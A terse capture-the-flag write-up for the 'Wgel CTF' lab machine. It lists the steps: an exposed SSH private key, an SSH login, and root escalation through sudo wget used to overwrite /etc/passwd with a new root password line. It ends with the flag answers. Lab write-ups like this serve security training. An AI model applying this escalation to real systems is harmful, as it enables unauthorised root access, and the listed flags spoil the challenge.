# Wgel CTF-id rsa expose&wget privilege escalation

```
export IP=10.10.233.65
```

# Material needed

1. Interesting directory: /sitemap/.ssh

2. SSH remote: ssh -i id_rsa jessie@$IP

3. sudo NOPASSWD: /usr/bin/wget

4. Privilege escalation: wget-download file

```
change root password in /etc/passwd
root:<newpasswd_crypt>:0:0:root:/root:/bin/bash
```

# Tasks

1. User flag? 057c67131c3d5e42dd5cd3075b198ff6

2. Root flag? b1b968b37519ad1daa6408188649263d